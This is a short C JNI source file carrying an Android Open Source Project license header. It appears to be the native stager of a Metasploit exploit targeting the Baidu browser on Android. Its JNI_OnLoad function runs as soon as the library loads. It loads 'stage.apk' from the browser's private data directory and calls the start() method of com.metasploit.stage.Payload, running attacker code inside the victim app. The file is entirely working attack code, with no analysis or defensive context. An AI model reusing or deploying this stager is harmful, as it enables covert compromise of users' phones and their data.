/*
 * Copyright (C) 2009 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 */
#include <string.h>
#include <stdio.h>
#include <jni.h>
#include <sys/system_properties.h>
#include <android/log.h>

JNIEXPORT jint JNICALL JNI_OnLoad( JavaVM *vm, void *pvt )
{
    JNIEnv *env;

    if((*vm)->GetEnv(vm, (void **)&env, JNI_VERSION_1_4) != JNI_OK)
    {
		return -1;
    }

    jstring jar_file = (*env)->NewStringUTF(env, "/data/data/com.baidu.browser.inter/stage.apk");
    jstring file_path = (*env)->NewStringUTF(env, "/data/data/com.baidu.browser.inter/");
    jstring class_file = (*env)->NewStringUTF(env, "com.metasploit.stage.Payload");
	jclass dex_class = (*env)->FindClass(env, "dalvik/system/DexClassLoader");
	jclass class_class = (*env)->FindClass(env, "java/lang/Class");
    jobject class_loader = (*env)->CallObjectMethod(env, class_class, (*env)->GetMethodID(env, class_class, "getClassLoader", "()Ljava/lang/ClassLoader;"));

	// Load the payload apk
    jobject dex_loader = (*env)->NewObject(env, dex_class, (*env)->GetMethodID(env, dex_class, "<init>", "(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V"),
        jar_file, file_path, file_path, class_loader);
    jclass payload_class = (*env)->CallObjectMethod(env, dex_loader,
        (*env)->GetMethodID(env, dex_class, "loadClass", "(Ljava/lang/String;)Ljava/lang/Class;"),
        class_file);

    // Call Payload.start();
    (*env)->CallStaticVoidMethod(env, payload_class, (*env)->GetStaticMethodID(env, payload_class, "start", "()V"));
    return JNI_VERSION_1_4;
}

JNIEXPORT void JNICALL JNI_OnUnload( JavaVM *vm, void *pvt )
{
}

